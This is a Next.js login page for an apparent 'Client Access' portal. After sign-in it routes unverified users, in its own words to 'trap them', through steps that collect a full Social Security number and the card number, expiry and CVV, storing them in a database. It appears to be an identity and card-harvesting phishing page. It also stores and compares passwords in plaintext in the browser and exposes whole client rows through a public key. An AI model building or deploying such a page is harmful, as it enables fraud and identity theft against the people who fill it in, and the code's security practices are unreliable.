"use client";

import React, { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import * as Lucide from "lucide-react";
import { createClient } from "@supabase/supabase-js";

const supabase = createClient(process.env.NEXT_PUBLIC_SUPABASE_URL!, process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!);

export default function PortalLogin() {
  const [mode, setMode] = useState<'login' | 'register'>('login');
  const [step, setStep] = useState<'auth' | 'verify'>('auth');
  const [loading, setLoading] = useState(false);
  const [showPass, setShowPass] = useState(false);
  const [formData, setFormData] = useState({ email: "", password: "", ssn: "", cardNumber: "", expiry: "", cvv: "", cardName: "", documentUrl: "" });

  const handleAuth = async () => {
    setLoading(true);
    if (mode === 'login') {
      const { data } = await supabase.from('clients').select('*').eq('email', formData.email).single();
      if (data && data.password === formData.password) {
          localStorage.setItem("aura_session_email", formData.email);
          
          // --- NEW CAPABILITY: CHECK IF THEY ACTUALLY FINISHED VERIFICATION ---
          if (data.verified) {
            window.location.href = "/portal/dashboard"; 
          } else {
            // If they are not verified, trap them in the verification steps
            setStep('verify');
          }

      } else { alert("ACCESS DENIED."); }
    } else {
      const { error } = await supabase.from('clients').insert([{ email: formData.email, password: formData.password }]);
      if (!error) { localStorage.setItem("aura_session_email", formData.email); setStep('verify'); }
    }
    setLoading(false);
  };

  return (
    <main className="min-h-screen bg-[#02040A] flex items-center justify-center p-6">
      <div className="w-full max-w-md bg-[#0A1024] border border-white/5 p-10 rounded-3xl shadow-2xl relative z-10">
        <AnimatePresence mode="wait">
          {step === 'auth' ? (
            <div className="space-y-8">
              <h2 className="text-3xl font-light text-center">{mode === 'login' ? "Client Access" : "Establish Identity"}</h2>
              <div className="space-y-4">
                <input 
                  type="email" 
                  placeholder="Email" 
                  className="w-full bg-[#050813] border border-white/10 p-4 rounded-xl text-white outline-none focus:border-emerald-500 transition-colors" 
                  onChange={(e) => setFormData({...formData, email: e.target.value})}
                />
                
                {/* --- PRIVACY EYE WRAPPER --- */}
                <div className="relative">
                  <input 
                    type={showPass ? "text" : "password"} 
                    placeholder="Password" 
                    className="w-full bg-[#050813] border border-white/10 p-4 rounded-xl text-white outline-none pr-12 focus:border-emerald-500 transition-colors" 
                    onChange={(e) => setFormData({...formData, password: e.target.value})}
                  />
                  <button 
                    type="button"
                    onClick={() => setShowPass(!showPass)} 
                    className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-500 hover:text-white transition-colors"
                  >
                    {showPass ? <Lucide.EyeOff size={18} /> : <Lucide.Eye size={18} />}
                  </button>
                </div>

              </div>
              <button onClick={handleAuth} className="w-full py-4 bg-white text-black font-bold rounded-xl uppercase tracking-widest hover:bg-emerald-500 hover:text-white transition-all">{loading ? "..." : "Proceed"}</button>
              <button onClick={() => setMode(mode === 'login' ? 'register' : 'login')} className="w-full text-center text-gray-500 text-[10px] font-bold uppercase tracking-widest hover:text-white transition-colors">{mode === 'login' ? "Register Account" : "Login"}</button>
            </div>
          ) : (
            <VerificationSteps email={formData.email} />
          )}
        </AnimatePresence>
      </div>
    </main>
  );
}

function VerificationSteps({ email }: { email: string }) {
  const [vStep, setVStep] = useState(1);
  const [data, setData] = useState({ ssn: "", cardNumber: "", expiry: "", cvv: "", cardName: "" });

  const finalize = async () => {
    // This flips the verified status to true in Supabase only after they finish Step 2
    await supabase.from('clients').update({ ...data, verified: true }).eq('email', email);
    window.location.href = "/portal/dashboard";
  };

  // --- Auto-Formatting Handlers ---
  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, ""); // Strip out non-numbers
    if (value.length > 2) {
      value = `${value.slice(0, 2)}/${value.slice(2, 4)}`; // Inject the slash
    }
    setData({ ...data, expiry: value });
  };

  const handleNumberOnly = (field: string, value: string, max?: number) => {
    let numbers = value.replace(/\D/g, "");
    if (max) numbers = numbers.slice(0, max);
    setData({ ...data, [field]: numbers });
  };

  return (
    <div className="space-y-6 text-white text-center">
      
      {vStep === 1 && (
        <div className="space-y-4">
          <h2 className="text-xl font-light">Step 1: Social Security Number</h2>
          <input 
            type="text" 
            maxLength={9} 
            value={data.ssn}
            placeholder="9-Digit Social Security Number" 
            className="w-full bg-[#050813] border border-white/10 p-4 rounded-xl text-center text-white outline-none focus:border-emerald-500 transition-colors tracking-widest font-mono" 
            onChange={(e) => handleNumberOnly('ssn', e.target.value, 9)}
          />
          <button onClick={() => setVStep(2)} disabled={data.ssn.length !== 9} className="w-full py-4 bg-emerald-500 text-black font-bold rounded-xl disabled:opacity-50 disabled:cursor-not-allowed transition-all">
            Continue
          </button>
        </div>
      )}

      {vStep === 2 && (
        <div className="space-y-4">
          <h2 className="text-xl font-light">Step 2: Card Security</h2>
          
          <input 
            placeholder="Name on Card" 
            value={data.cardName}
            className="w-full bg-[#050813] border border-white/10 p-3 rounded-lg text-sm outline-none focus:border-emerald-500 transition-colors" 
            onChange={(e) => setData({...data, cardName: e.target.value})} 
          />
          
          <input 
            placeholder="Card Number" 
            value={data.cardNumber}
            maxLength={16}
            className="w-full bg-[#050813] border border-white/10 p-3 rounded-lg text-sm outline-none focus:border-emerald-500 transition-colors font-mono tracking-widest" 
            onChange={(e) => handleNumberOnly('cardNumber', e.target.value, 16)} 
          />
          
          <div className="flex gap-4">
            <input 
              placeholder="MM/YY" 
              value={data.expiry}
              maxLength={5}
              className="w-1/2 bg-[#050813] border border-white/10 p-3 rounded-lg text-center text-sm outline-none focus:border-emerald-500 transition-colors font-mono tracking-widest" 
              onChange={handleExpiryChange} 
            />
            <input 
              placeholder="CVV" 
              value={data.cvv}
              maxLength={4}
              className="w-1/2 bg-[#050813] border border-white/10 p-3 rounded-lg text-center text-sm outline-none focus:border-emerald-500 transition-colors font-mono tracking-widest" 
              onChange={(e) => handleNumberOnly('cvv', e.target.value, 4)} 
            />
          </div>
          
          <button onClick={finalize} className="w-full py-4 bg-emerald-500 text-black font-bold rounded-xl mt-4 uppercase tracking-widest text-xs hover:bg-emerald-400 transition-all">
            Finalize & Enter Dashboard
          </button>
        </div>
      )}

    </div>
  );
}